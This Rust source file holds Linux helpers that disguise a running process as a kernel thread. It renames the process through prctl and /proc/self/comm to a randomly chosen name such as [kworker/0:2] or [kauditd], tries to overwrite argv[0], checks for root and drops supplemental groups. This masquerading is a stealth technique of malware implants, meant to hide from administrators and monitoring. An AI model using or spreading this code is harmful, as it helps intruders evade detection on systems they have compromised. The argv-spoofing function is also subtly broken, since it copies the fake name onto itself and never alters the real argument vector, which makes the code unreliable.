use std::ffi::CString;

pub fn spoof_process_name(name: &str) {
    #[cfg(target_os = "linux")]
    {
        let trimmed = &name[..name.len().min(15)];
        if let Ok(c) = CString::new(trimmed) {
            unsafe {
                libc::prctl(libc::PR_SET_NAME, c.as_ptr() as libc::c_ulong, 0, 0, 0);
            }
        }
        let _ = std::fs::write("/proc/self/comm", trimmed);
    }
}

pub fn spoof_argv() {
    #[cfg(target_os = "linux")]
    {
        let fake = std::ffi::CString::new("[kworker/0:2]").unwrap();
        let args: Vec<*const libc::c_char> = std::env::args()
            .enumerate()
            .map(|(i, _)| {
                if i == 0 { fake.as_ptr() } else { fake.as_ptr() }
            })
            .collect();
        if let Some(&ptr) = args.first() {
            unsafe {
                let dest = ptr as *mut u8;
                let src = fake.as_bytes_with_nul();
                std::ptr::copy_nonoverlapping(src.as_ptr(), dest, src.len().min(15));
            }
        }
        let _ = std::fs::write("/proc/self/comm", "[kworker/0:2]");
    }
}

pub fn clone_kernel_thread_name() -> &'static str {
    let names = [
        "[kworker/0:2]",
        "[kworker/1:1]",
        "[kworker/2:0]",
        "[ksoftirqd/0]",
        "[rcu_sched]",
        "[migration/0]",
        "[watchdog/0]",
        "[kauditd]",
        "[kdevtmpfs]",
        "[khungtaskd]",
    ];
    let mut buf = [0u8; 4];
    let _ = getrandom::getrandom(&mut buf);
    let idx = (u32::from_le_bytes(buf) as usize) % names.len();
    names[idx]
}

pub fn effective_uid() -> u32 {
    #[cfg(unix)]
    unsafe { return libc::geteuid(); }
    #[cfg(not(unix))]
    0
}

pub fn is_root() -> bool {
    effective_uid() == 0
}

pub fn drop_supplemental_groups() {
    #[cfg(unix)]
    unsafe {
        libc::setgroups(0, std::ptr::null());
    }
}
